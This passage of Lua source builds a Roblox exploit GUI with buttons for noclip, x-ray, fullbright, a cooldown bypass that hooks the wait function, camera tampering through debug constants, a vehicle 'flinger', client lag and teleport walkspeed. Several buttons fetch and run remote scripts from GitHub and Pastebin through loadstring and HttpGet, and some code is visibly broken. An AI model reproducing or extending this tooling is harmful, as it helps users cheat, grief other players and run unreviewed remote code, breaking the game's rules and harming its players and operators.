oc20.BackgroundColor3 = Color3.new(0, 0, 0)
oc20.BorderColor3 = Color3.new(1, 0, 0)
oc20.BorderSizePixel = 3
oc20.TextColor3 = Color3.new(1, 1, 1)
oc20.TextScaled = true
oc20.Font = Enum.Font.SourceSans
oc20.Text = "View player"

local oc21 = Instance.new("TextButton")
oc21.Parent = Others
oc21.Name = "oc21"
oc21.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc21.Position = UDim2.new(0.35, 0, 0.750, 0)
oc21.BackgroundColor3 = Color3.new(0, 0, 0)
oc21.BorderColor3 = Color3.new(1, 0, 0)
oc21.BorderSizePixel = 3
oc21.TextColor3 = Color3.new(1, 1, 1)
oc21.TextScaled = true
oc21.Font = Enum.Font.SourceSans
oc21.Text = "Tween to Player"

local oc22 = Instance.new("TextBox")
oc22.Parent = Others
oc22.Name = "oc22"
oc22.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc22.Position = UDim2.new(0.52, 0, 0.750, 0)
oc22.BackgroundColor3 = Color3.new(1, 1, 1)
oc22.BorderColor3 = Color3.new(1, 0, 0)
oc22.BorderSizePixel = 3
oc22.TextColor3 = Color3.new(0, 0, 0)
oc22.TextScaled = true
oc22.Font = Enum.Font.SourceSans
oc22.Text = "Player Name"
oc22.PlaceholderText = "Username"
oc22.TextXAlignment = Enum.TextXAlignment.Center
oc22.TextYAlignment = Enum.TextYAlignment.Center

local oc23 = Instance.new("TextButton")
oc23.Parent = Others
oc23.Name = "oc23"
oc23.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc23.Position = UDim2.new(0.69, 0, 0.750, 0)
oc23.BackgroundColor3 = Color3.new(0, 0, 0)
oc23.BorderColor3 = Color3.new(1, 0, 0)
oc23.BorderSizePixel = 3
oc23.TextColor3 = Color3.new(1, 1, 1)
oc23.TextScaled = true
oc23.Font = Enum.Font.SourceSans
oc23.Text = "Noclip"

NoclippingConnection = nil 
IsNoclipping = false 

oc23.MouseButton1Click:Connect(function()
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()

    if not IsNoclipping then 
        IsNoclipping = true
        wait(0.1) 

        local function NoclipLoop()
            if IsNoclipping and character ~= nil then
                for _, child in pairs(character:GetDescendants()) do
                    if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
                        child.CanCollide = false
                    end
                end
            end
        end
        NoclippingConnection = RunService.Stepped:Connect(NoclipLoop)
        oc23.Text = "UnNoclip"
    else 
        IsNoclipping = false
        if NoclippingConnection then
            NoclippingConnection:Disconnect()
            NoclippingConnection = nil
        end

        oc23.Text = "Noclip"
    end
end)

local oc24 = Instance.new("TextButton")
oc24.Parent = Others
oc24.Name = "oc24"
oc24.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
oc24.Position = UDim2.new(0.86, 0, 0.750, 0)
oc24.BackgroundColor3 = Color3.new(0, 0, 0)
oc24.BorderColor3 = Color3.new(1, 0, 0)
oc24.BorderSizePixel = 3
oc24.TextColor3 = Color3.new(1, 1, 1)
oc24.TextScaled = true
oc24.Font = Enum.Font.SourceSans
oc24.Text = "Void"

local ocn25 = Instance.new("TextButton")
ocn25.Parent = Others
ocn25.Name = "ocn25"
ocn25.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn25.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
ocn25.BackgroundColor3 = Color3.new(0, 0, 0)
ocn25.BorderColor3 = Color3.new(1, 0, 0)
ocn25.BorderSizePixel = 3
ocn25.TextColor3 = Color3.new(1, 1, 1)
ocn25.TextScaled = true
ocn25.Font = Enum.Font.SourceSans
ocn25.Text = "Remote Gui"
ocn25.Visible = false
ocn25.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Remote-gui-edited/refs/heads/main/Remote%20Finder%20by%201x98n6ex6.lua"))()
    	notif({
		Text = "Please wait a sec",
		Duration = 5,
		topm = "Be Pantient!"
	})
end)

ocn26 = Instance.new("TextButton")
ocn26.Parent = Others
ocn26.Name = "ocn26"
ocn26.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn26.Position = UDim2.new(0.18, 0, 0.03, 0)
ocn26.BackgroundColor3 = Color3.new(0, 0, 0)
ocn26.BorderColor3 = Color3.new(1, 0, 0)
ocn26.BorderSizePixel = 3
ocn26.TextColor3 = Color3.new(1, 1, 1)
ocn26.TextScaled = true
ocn26.Font = Enum.Font.SourceSans
ocn26.Text = "UnBan VC"
ocn26.Visible = false
ocn26.MouseButton1Click:Connect(function()
game:GetService("VoiceChatService"):joinVoice()
end)

ocn27 = Instance.new("TextButton")
ocn27.Parent = Others
ocn27.Name = "ocn27"
ocn27.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn27.Position = UDim2.new(0.35, 0, 0.03, 0)
ocn27.BackgroundColor3 = Color3.new(0, 0, 0)
ocn27.BorderColor3 = Color3.new(1, 0, 0)
ocn27.BorderSizePixel = 3
ocn27.TextColor3 = Color3.new(1, 1, 1)
ocn27.TextScaled = true
ocn27.Font = Enum.Font.SourceSans
ocn27.Text = "cooldown bypass"
ocn27.Visible = false
ocn27.MouseButton1Click:Connect(function()
if hookfunction then 
    g = hookfunction(wait, function(seconds) return g(0) end)
    else
    	notif({
		Text = "Your exploit does not support this script please try using a better exploit other than "..identifyexecutor(),
		Duration = 5,
		topm = "Warning!"
	})
    end
end)

ocn28 = Instance.new("TextButton")
ocn28.Parent = Others
ocn28.Name = "ocn28"
ocn28.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn28.Position = UDim2.new(0.52, 0, 0.03, 0)
ocn28.BackgroundColor3 = Color3.new(0, 0, 0)
ocn28.BorderColor3 = Color3.new(1, 0, 0)
ocn28.BorderSizePixel = 3
ocn28.TextColor3 = Color3.new(1, 1, 1)
ocn28.TextScaled = true
ocn28.Font = Enum.Font.Roboto
ocn28.Text = "Fake R6"
ocn28.Visible = false
ocn28.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
end)

ocn29 = Instance.new("TextButton")
ocn29.Parent = Others
ocn29.Name = "ocn29"
ocn29.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn29.Position = UDim2.new(0.69, 0, 0.03, 0)
ocn29.BackgroundColor3 = Color3.new(0, 0, 0)
ocn29.BorderColor3 = Color3.new(1, 0, 0)
ocn29.BorderSizePixel = 3
ocn29.TextColor3 = Color3.new(1, 1, 1)
ocn29.TextScaled = true
ocn29.Font = Enum.Font.Roboto
ocn29.Text = "Fast ProximityPrompt"
ocn29.Visible = false
ocn29.MouseButton1Click:Connect(function()
-- hello :D
local ProximityPromptService = game:GetService("ProximityPromptService")
local instantInteractEnabled = true

ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
    if instantInteractEnabled then
        fireproximityprompt(prompt)
    end
end)
end)

ocn30 = Instance.new("TextButton")
ocn30.Parent = Others
ocn30.Name = "ocn30"
ocn30.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocn30.Position = UDim2.new(0.86, 0, 0.03, 0)
ocn30.BackgroundColor3 = Color3.new(0, 0, 0)
ocn30.BorderColor3 = Color3.new(1, 0, 0)
ocn30.BorderSizePixel = 3
ocn30.TextColor3 = Color3.new(1, 1, 1)
ocn30.TextScaled = true
ocn30.Font = Enum.Font.Roboto
ocn30.Text = "Follow Unachored Parts"
ocn30.Visible = false
--[[ FE Unanchored Parts Follow
    Script made by Cyclically | Credits to dhruvil123 for a few parts of the script
    also credits to "Discordgotbanned" in discord for giving me motivation to fix this script
    https://v3rmillion.net/member.php?action=profile&uid=785986
    Don't edit script unless you know what you're doing. If you wanna add this into a script

    the floating unanchored parts around u will stop floating when a player is near but it will come back when they get far away again, this is due roblox's gay ass networkownershit
]]


ocn31 = Instance.new("TextButton")
ocn31.Parent = Others
ocn31.Name = "ocn31"
ocn31.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn31.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
ocn31.BackgroundColor3 = Color3.new(0, 0, 0)
ocn31.BorderColor3 = Color3.new(1, 0, 0)
ocn31.BorderSizePixel = 3
ocn31.TextColor3 = Color3.new(1, 1, 1)
ocn31.TextScaled = true
ocn31.Font = Enum.Font.SourceSans
ocn31.Text = "Invisible Parts"
ocn31.Visible = false

ocn32 = Instance.new("TextButton")
ocn32.Parent = Others
ocn32.Name = "ocn32"
ocn32.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn32.Position = UDim2.new(0.18, 0, 0.229999959, 0)
ocn32.BackgroundColor3 = Color3.new(0, 0, 0)
ocn32.BorderColor3 = Color3.new(1, 0, 0)
ocn32.BorderSizePixel = 3
ocn32.TextColor3 = Color3.new(1, 1, 1)
ocn32.TextScaled = true
ocn32.Font = Enum.Font.SourceSans
ocn32.Text = "Fullbright"
ocn32.Visible = false
ocn32.MouseButton1Click:Connect(function()
Lighting.Brightness = 2
	Lighting.ClockTime = 14
	Lighting.FogEnd = 100000
	Lighting.GlobalShadows = false
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
end)

local origsettings = {
	abt = Lighting.Ambient,
	oabt = Lighting.OutdoorAmbient,
	brt = Lighting.Brightness,
	time = Lighting.ClockTime,
	fe = Lighting.FogEnd,
	fs = Lighting.FogStart,
	gs = Lighting.GlobalShadows
}

ocn33 = Instance.new("TextButton")
ocn33.Parent = Others
ocn33.Name = "ocn33"
ocn33.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn33.Position = UDim2.new(0.35, 0, 0.229999959, 0)
ocn33.BackgroundColor3 = Color3.new(0, 0, 0)
ocn33.BorderColor3 = Color3.new(1, 0, 0)
ocn33.BorderSizePixel = 3
ocn33.TextColor3 = Color3.new(1, 1, 1)
ocn33.TextScaled = true
ocn33.Font = Enum.Font.Roboto
ocn33.Text = "Restore Lightning"
ocn33.Visible = false
ocn33.MouseButton1Click:Connect(function()
	Lighting.Ambient = origsettings.abt
	Lighting.OutdoorAmbient = origsettings.oabt
	Lighting.Brightness = origsettings.brt
	Lighting.ClockTime = origsettings.time
	Lighting.FogEnd = origsettings.fe
	Lighting.FogStart = origsettings.fs
	Lighting.GlobalShadows = origsettings.gs
end)

ocn34 = Instance.new("TextButton")
ocn34.Parent = Others
ocn34.Name = "ocn34"
ocn34.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn34.Position = UDim2.new(0.52, 0, 0.229999959, 0)
ocn34.BackgroundColor3 = Color3.new(0, 0, 0)
ocn34.BorderColor3 = Color3.new(1, 0, 0)
ocn34.BorderSizePixel = 3
ocn34.TextColor3 = Color3.new(1, 1, 1)
ocn34.TextScaled = true
ocn34.Font = Enum.Font.Roboto
ocn34.Text = "Noclip Camera"
ocn34.Visible = false
ocn34.MouseButton1Click:Connect(function()
local sc = (debug and debug.setconstant) or setconstant
	local gc = (debug and debug.getconstants) or getconstants
	if not sc or not getgc or not gc then
		return notif({
		Text = "Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)",
		Duration = 5,
		topm = "Information!"
	})
	end
	local pop = game.Players.LocalPlayer.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
	for _, v in pairs(getgc()) do
		if type(v) == 'function' and getfenv(v).script == pop then
			for i, v1 in pairs(gc(v)) do
				if tonumber(v1) == .25 then
					sc(v, i, 0)
				elseif tonumber(v1) == 0 then
					sc(v, i, .25)
				end
			end
		end
	end
end)

ocn35 = Instance.new("TextButton")
ocn35.Parent = Others
ocn35.Name = "ocn35"
ocn35.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn35.Position = UDim2.new(0.69, 0, 0.229999959, 0)
ocn35.BackgroundColor3 = Color3.new(0, 0, 0)
ocn35.BorderColor3 = Color3.new(1, 0, 0)
ocn35.BorderSizePixel = 3
ocn35.TextColor3 = Color3.new(1, 1, 1)
ocn35.TextScaled = true
ocn35.Font = Enum.Font.Roboto
ocn35.Text = "Maxzoom Camera"
ocn35.Visible = false
ocn35.MouseButton1Click:Connect(function()
game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
end)

ocn36 = Instance.new("TextButton")
ocn36.Parent = Others
ocn36.Name = "ocn36"
ocn36.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocn36.Position = UDim2.new(0.86, 0, 0.229999959, 0)
ocn36.BackgroundColor3 = Color3.new(0, 0, 0)
ocn36.BorderColor3 = Color3.new(1, 0, 0)
ocn36.BorderSizePixel = 3
ocn36.TextColor3 = Color3.new(1, 1, 1)
ocn36.TextScaled = true
ocn36.Font = Enum.Font.Roboto
ocn36.Text = "Unlock Workspace"
ocn36.Visible = false
ocn36.MouseButton1Click:Connect(function()
for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			v.Locked = false
		end
	end
end)

ocn37 = Instance.new("TextButton")
ocn37.Parent = Others
ocn37.Name = "ocn37"
ocn37.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn37.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
ocn37.BackgroundColor3 = Color3.new(0, 0, 0)
ocn37.BorderColor3 = Color3.new(0, 0, 1)
ocn37.BorderSizePixel = 3
ocn37.TextColor3 = Color3.new(1, 1, 1)
ocn37.TextScaled = true
ocn37.Font = Enum.Font.Roboto
ocn37.Text = "Freeze"
ocn37.Visible = false

xrayEnabled = false

function xray()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v.Parent:FindFirstChildWhichIsA("Humanoid") and not v.Parent.Parent:FindFirstChildWhichIsA("Humanoid") then
            v.LocalTransparencyModifier = xrayEnabled and 0.5 or 0
        end
    end
end

ocn38 = Instance.new("TextButton")
ocn38.Parent = Others
ocn38.Name = "ocn38"
ocn38.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn38.Position = UDim2.new(0.18, 0, 0.43, 0)
ocn38.BackgroundColor3 = Color3.new(0, 0, 0)
ocn38.BorderColor3 = Color3.new(1, 0, 0)
ocn38.BorderSizePixel = 3
ocn38.TextColor3 = Color3.new(1, 1, 1)
ocn38.TextScaled = true
ocn38.Font = Enum.Font.Roboto
ocn38.Text = "X-Ray: Off"
ocn38.Visible = false
ocn38.MouseButton1Click:Connect(function()
    xrayEnabled = not xrayEnabled
    xray() 
    ocn38.Text = "X-Ray: " .. (xrayEnabled and "On" or "Off")
end)

ocn39 = Instance.new("TextButton")
ocn39.Parent = Others
ocn39.Name = "ocn39"
ocn39.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn39.Position = UDim2.new(0.35, 0, 0.43, 0)
ocn39.BackgroundColor3 = Color3.new(0, 0, 0)
ocn39.BorderColor3 = Color3.new(1, 0, 0)
ocn39.BorderSizePixel = 3
ocn39.TextColor3 = Color3.new(1, 1, 1)
ocn39.TextScaled = true
ocn39.Font = Enum.Font.Roboto
ocn39.Text = "Glitching Position"
ocn39.Visible = false

ocn40 = Instance.new("TextButton")
ocn40.Parent = Others
ocn40.Name = "ocn40"
ocn40.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn40.Position = UDim2.new(0.52, 0, 0.43, 0)
ocn40.BackgroundColor3 = Color3.new(0, 0, 0)
ocn40.BorderColor3 = Color3.fromRGB(255, 125, 0)
ocn40.BorderSizePixel = 3
ocn40.TextColor3 = Color3.new(1, 1, 1)
ocn40.TextScaled = true
ocn40.Font = Enum.Font.Roboto
ocn40.Text = "Call Remotes"
ocn40.Visible = false
ocn40.MouseButton1Click:Connect(function()
notif({
		Text = "Be careful!. You may can get Banned or Kicked in some games using this script!",
		Duration = 5,
		topm = "Warning!"
	})
end)

ocn41 = Instance.new("TextButton")
ocn41.Parent = Others
ocn41.Name = "ocn41"
ocn41.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn41.Position = UDim2.new(0.69, 0, 0.43, 0)
ocn41.BackgroundColor3 = Color3.new(0, 0, 0)
ocn41.BorderColor3 = Color3.new(1, 0, 0)
ocn41.BorderSizePixel = 3
ocn41.TextColor3 = Color3.new(1, 1, 1)
ocn41.TextScaled = true
ocn41.Font = Enum.Font.Roboto
ocn41.Text = "Random Glitching Position"
ocn41.Visible = false
ocn41.MouseButton1Click:Connect(function()
notif({
		Text = "just a Random script made for me lol😂",
		Duration = 2,
		topm = "Dont care!"
	})
end)

ocn42 = Instance.new("TextButton")
ocn42.Parent = Others
ocn42.Name = "ocn42"
ocn42.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocn42.Position = UDim2.new(0.86, 0, 0.43, 0)
ocn42.BackgroundColor3 = Color3.new(0, 0, 0)
ocn42.BorderColor3 = Color3.new(1, 0, 0)
ocn42.BorderSizePixel = 3
ocn42.TextColor3 = Color3.new(1, 1, 1)
ocn42.TextScaled = true
ocn42.Font = Enum.Font.Roboto
ocn42.Text = "Tp down"
ocn42.Visible = false
ocn42.MouseButton1Click:Connect(function()
	local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

	if humanoid and humanoidRootPart then
		local alPosition = humanoidRootPart.Position

		for i = 1, 3 do
			local currentPosition = humanoidRootPart.Position
			local newPosition = currentPosition + Vector3.new(0, -100, 0)
			humanoidRootPart.CFrame = CFrame.new(newPosition)
			wait(0.3)
		end

		humanoid.Jump = true
		wait()

		humanoidRootPart.CFrame = CFrame.new(alPosition)
	else
		warn("HumanoidRootPart not found.")
	end
end)

ocn43 = Instance.new("TextButton")
ocn43.Parent = Others
ocn43.Name = "ocn43"
ocn43.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn43.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
ocn43.BackgroundColor3 = Color3.new(0, 0, 0)
ocn43.BorderColor3 = Color3.new(1, 0, 0)
ocn43.BorderSizePixel = 3
ocn43.TextColor3 = Color3.new(1, 1, 1)
ocn43.TextScaled = true
ocn43.Font = Enum.Font.Roboto
ocn43.Text = "Vehicle Goto Player"
ocn43.Visible = false
ocn43.MouseButton1Click:Connect(function()
function getPlayer(nameOrId, speaker)
    local players = {}
    local PlayersService = game:GetService("Players")

    local playerByName = PlayersService:FindFirstChild(nameOrId)
    if playerByName then
        table.insert(players, playerByName.Name) 
    else
        for _, player in ipairs(PlayersService:GetPlayers()) do
            if string.find(string.lower(player.Name), string.lower(nameOrId), 1, true) then
                table.insert(players, player.Name) 
    else
        for _, player in ipairs(PlayersService:GetPlayers()) do
        if string.lower(player.DisplayName) == string.lower(nameOrId) then
            table.insert(foundPlayers, player)
        end
    end
            end
        end
    end
    if #players == 0 then
        notif({
		Text = "Player not found.",
		Duration = 5,
		topm = "Information!"
	})
    elseif #players > 1 then
        notif({
		Text = "Multiple players found for '" .. nameOrId .. "'. Please be more specific.",
		Duration = 5,
		topm = "Information!"
	})
        players = {}
    end

    return players
end

function getRt(character)
    if character and character:IsA("Model") then
        return character:FindFirstChild("HumanoidRootPart")
    end
    return nil
end
    local targetPlayerName = ocn49.Text 
    local speaker = game.Players.LocalPlayer 

    local resolvedPlayerNames = getPlayer(targetPlayerName, speaker)

    if #resolvedPlayerNames > 0 then
        local actualTargetPlayer = game.Players:FindFirstChild(resolvedPlayerNames[1]) 

        if actualTargetPlayer and actualTargetPlayer.Character then
            local speakerHumanoid = speaker.Character:FindFirstChildOfClass('Humanoid')
            if speakerHumanoid and speakerHumanoid.SeatPart then
                local seat = speakerHumanoid.SeatPart
                local vehicleModel = seat:FindFirstAncestorWhichIsA("Model")

                if vehicleModel then
                    local targetHumanoidRootPart = getRt(actualTargetPlayer.Character)
                    if targetHumanoidRootPart then
                        vehicleModel:MoveTo(targetHumanoidRootPart.Position)
                    else
                        notif({
		Text = "Target player's HumanoidRootPart not found.",
		Duration = 3,
		topm = "Error!"
	})
                    end
                else
                    notif({
		Text = "Vehicle model not found. Are you in a vehicle?",
		Duration = 2,
		topm = "Error!"
	})
                end
            else
                notif({
		Text = "You are not seated in a vehicle.",
		Duration = 5,
		topm = "Information!"
	})
            end
        else
            notif({
		Text = "Target player '" .. targetPlayerName .. "' not found or their character is not loaded.",
		Duration = 5,
		topm = "Error!"
	})
        end
    end
end)

ocn44 = Instance.new("TextButton")
ocn44.Parent = Others
ocn44.Name = "ocn44"
ocn44.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn44.Position = UDim2.new(0.18, 0, 0.63, 0)
ocn44.BackgroundColor3 = Color3.new(0, 0, 0)
ocn44.BorderColor3 = Color3.new(1, 0, 0)
ocn44.BorderSizePixel = 3
ocn44.TextColor3 = Color3.new(1, 1, 1)
ocn44.TextScaled = true
ocn44.Font = Enum.Font.Roboto
ocn44.Text = "Fe Vehicle Flinger"
ocn44.Visible = false
ocn44.MouseButton1Click:Connect(function()
notif({
		Text = "Not Made By me",
		Duration = 1,
		topm = "Who made this?!"
	})
wait(0.5)
-- Scripted on mobile
-- Fe Vehicle Fling Alpha

-- Start UP

local notification = Instance.new("Sound")
notification.Parent = game:GetService("SoundService")
notification.SoundId = "rbxassetid://9086208751"
notification.Volume = 1 

local char = game.Players.LocalPlayer.Character
function getRoot(char)
 local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
 return rootPart
end

-- Part Detector Seat

local SPart = Instance.new("Part");
local Player = game:GetService('Players').LocalPlayer;
repeat game:GetService('RunService').RenderStepped:Wait() until Player.Character;
local Character = Player.Character;
SPart.Anchored, SPart.CanCollide = false, false;
SPart.Parent = workspace;
SPart.Size = Vector3.new(2, 100, 22)
SPart.Transparency = 0.4
game:GetService('RunService').Stepped:Connect(function()
    local Ray = Ray.new(Character.PrimaryPart.Position + Character.PrimaryPart.CFrame.LookVector * 4, Vector3.new(0,-1,0) * 4);
    local FPOR = workspace:FindPartOnRayWithIgnoreList(Ray, {Character});
    if (FPOR) then
        SPart.CFrame = Character.PrimaryPart.CFrame + Character.PrimaryPart.CFrame.LookVector * 4;
    end
if SPart == nil then
Ray:destroy()
FPOR:destroy()
end
end)

game.StarterGui:SetCore("SendNotification", {
    Title = "FE Vehicle Fling";
    Icon = "rbxassetid://7279804519";
    Text = "Identify Passanger Seat, Part_OnTouched";
    Duration = 10;
notification:Play()
})

-- The finish touches
-- Mobile and PC Support BODYGYRO

SPart.Touched:Connect(function(hit)
   if hit:IsA("Seat") then
      local IsFlying = False
local flyv
local flyg
local Player = game.Players.LocalPlayer
local Speed = 50
local LastSpeed = Speed
local maxspeed = 100
local IsRunning = false
local f = 0

IsFlying = true
    flyv = Instance.new("BodyVelocity")
 
   flyv.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
    flyv.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
 
    flyg = Instance.new("BodyGyro")
   flyg.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
    flyg.MaxTorque = Vector3.new(9e9,9e9,9e9)
    flyg.P = 1000
    flyg.D = 50

Player.Character:WaitForChild('Humanoid').PlatformStand = true

Player.Character.Humanoid.Changed:Connect(function(Prop)
  
   if Player.Character.Humanoid.MoveDirection == Vector3.new(0,0,0) then
    IsRunning = false
   else
    IsRunning = true
   end 
 end)

spawn(function()
  while true do
   wait()
  if IsFlying then
   
    flyg.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((f+0)*50*Speed/maxspeed),0,0) 
     flyv.Velocity = workspace.CurrentCamera.CoordinateFrame.LookVector * Speed
     wait(0.1)
     
     if Speed < 0 then
     Speed = 0
     f = 0
end
end
   if IsRunning then
   Speed = LastSpeed
  else
   if not Speed == 0 then
    LastSpeed = Speed
   end 
   Speed = 0
  end
  end
end)
Speed = 0.1
wait(0.3)
hit:Sit(game:GetService("Players").LocalPlayer.Character.Humanoid)
SPart:Destroy()
wait(0.3)
local speaker = game.Players.LocalPlayer
local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
 local vehicleModel = seat.Parent
 repeat
  if vehicleModel.ClassName ~= "Model" then
   vehicleModel = vehicleModel.Parent
  end
 until vehicleModel.ClassName == "Model"
 wait(0.1)
 for i,v in pairs(vehicleModel:GetDescendants()) do
  if v:IsA("BasePart") and v.CanCollide then
   v.CanCollide = false
  end
 end

wait(0.2)
Speed = 80
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = getRoot(speaker.Character)
Spin.MaxTorque = Vector3.new(0, math.huge, 0) 
Spin.AngularVelocity = Vector3.new(0,2000,0)
game.StarterGui:SetCore("SendNotification", {
    Title = "FE Vehicle Fling";
    Icon = "rbxassetid://7279804519";
    Text = "Identified the seat part, Success!";
    Duration = 10;
notification:Play()
})
end
end)
end)


tpwalking = false 
ocn45 = Instance.new("TextButton")
ocn45.Parent = Others
ocn45.Name = "ocn45"
ocn45.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn45.Position = UDim2.new(0.35, 0, 0.63, 0)
ocn45.BackgroundColor3 = Color3.new(0, 0, 0)
ocn45.BorderColor3 = Color3.new(1, 0, 0)
ocn45.BorderSizePixel = 3
ocn45.TextColor3 = Color3.new(1, 1, 1)
ocn45.TextScaled = true
ocn45.Font = Enum.Font.Roboto
ocn45.Text = "Tp walkspeed"
ocn45.Visible = false
ocn45.MouseButton1Click:Connect(function()
local function startTeleportWalk(speedMultiplier)
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")

    if not humanoid then return end 
    while tpwalking and character and humanoid and humanoid.Parent do
        local delta = RunService.Heartbeat:Wait()
        if humanoid.MoveDirection.Magnitude > 0 then
            character:TranslateBy(humanoid.MoveDirection * speedMultiplier * delta)
        end
    end
end

    tpwalking = not tpwalking 
    if tpwalking then
        ocn45.Text = "Walkspeeded"
        
        local speed = 10 
        if ocn50 and ocn50:IsA("TextBox") then
            local parsedSpeed = tonumber(ocn50.Text)
            if parsedSpeed and parsedSpeed > 0 then                speed = parsedSpeed
            end
        end
        
        coroutine.wrap(startTeleportWalk)(speed)
    else
        ocn45.Text = "Tp Walkspeed"
    end
end)

ocn46 = Instance.new("TextButton")
ocn46.Parent = Others
ocn46.Name = "ocn46"
ocn46.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn46.Position = UDim2.new(0.52, 0, 0.63, 0)
ocn46.BackgroundColor3 = Color3.new(0, 0, 0)
ocn46.BorderColor3 = Color3.new(0, 0, 1)
ocn46.BorderSizePixel = 3
ocn46.TextColor3 = Color3.new(1, 1, 1)
ocn46.TextScaled = true
ocn46.Font = Enum.Font.Roboto
ocn46.Text = "Set HeadSize Player"
ocn46.Visible = false

ocn47 = Instance.new("TextButton")
ocn47.Parent = Others
ocn47.Name = "ocn47"
ocn47.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocn47.Position = UDim2.new(0.69, 0, 0.63, 0)
ocn47.BackgroundColor3 = Color3.new(0, 0, 0)
ocn47.BorderColor3 = Color3.new(1, 0, 0)
ocn47.BorderSizePixel = 3
ocn47.TextColor3 = Color3.new(1, 1, 1)
ocn47.TextScaled = true
ocn47.Font = Enum.Font.Roboto
ocn47.Text = "Teleport to Player and Return"
ocn47.Visible = false

isLagging = false
lagConnection = nil 
LAG_AMOUNT = 0.5 

ocn48 = Instance.new("TextButton")
ocn48.Parent = Others
ocn48.Name = "ocn48"
ocn48.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocn48.Position = UDim2.new(0.86, 0, 0.63, 0)
ocn48.BackgroundColor3 = Color3.new(0, 0, 0)
ocn48.BorderColor3 = Color3.new(1, 0, 0)
ocn48.BorderSizePixel = 3
ocn48.TextColor3 = Color3.new(1, 1, 1)
ocn48.TextScaled = true
ocn48.Font = Enum.Font.Roboto
ocn48.Text = "Client Lag"
ocn48.Visible = false
ocn48.MouseButton1Click:Connect(function()
    isLagging = not isLagging -- Toggle the state

    if isLagging then
        ocn48.Text = "Stop"
        lagConnection = game:GetService("RunService").Heartbeat:Connect(function()
            settings():GetService("NetworkSettings").IncomingReplicationLag = LAG_AMOUNT
        end)
    else
        ocn48.Text = "Client Lag"
        if lagConnection then
            lagConnection:Disconnect()
            lagConnection = nil
        end
        settings():GetService("NetworkSettings").IncomingReplicationLag = 0
    end
end)

ocn49 = Instance.new("TextBox")
ocn49.Parent = Others
ocn49.Name = "ocn49"
ocn49.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
ocn49.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
ocn49.BackgroundColor3 = Color3.new(1, 1, 1)
ocn49.BorderColor3 = Color3.new(1, 0, 0)
ocn49.BorderSizePixel = 2
ocn49.TextColor3 = Color3.new(0, 0, 0)
ocn49.TextScaled = true
ocn49.Font = Enum.Font.Roboto
ocn49.Text = "Playername..."
ocn49.PlaceholderText = "Playername Here..."
ocn49.PlaceholderColor3 = Color3.fromRGB(190, 190, 190)
ocn49.Visible = false

ocn50 = Instance.new("TextBox")
ocn50.Parent = Others
ocn50.Name = "ocn50"
ocn50.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
ocn50.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
ocn50.BackgroundColor3 = Color3.new(1, 1, 1)
ocn50.BorderColor3 = Color3.new(1, 0, 0)
ocn50.BorderSizePixel = 2
ocn50.TextColor3 = Color3.new(0, 0, 0)
ocn50.TextScaled = true
ocn50.Font = Enum.Font.Roboto
ocn50.Text = "Number..."
ocn50.PlaceholderText = "Number Here..."
